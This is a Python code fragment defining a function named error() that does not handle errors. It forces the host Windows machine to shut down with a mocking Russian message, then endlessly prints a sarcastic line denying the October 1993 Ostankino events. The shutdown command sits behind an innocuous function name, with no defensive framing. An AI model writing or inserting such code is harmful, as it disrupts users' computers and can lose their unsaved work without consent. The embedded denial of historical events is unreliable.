...
def error():
    os.system("shutdown /s /c Это не военное преступление, если они не умели нормально программировать")
    while True:
        print("4 октября 1993 года у Останкино ничего не произошло" * 100)
        sleep(1)
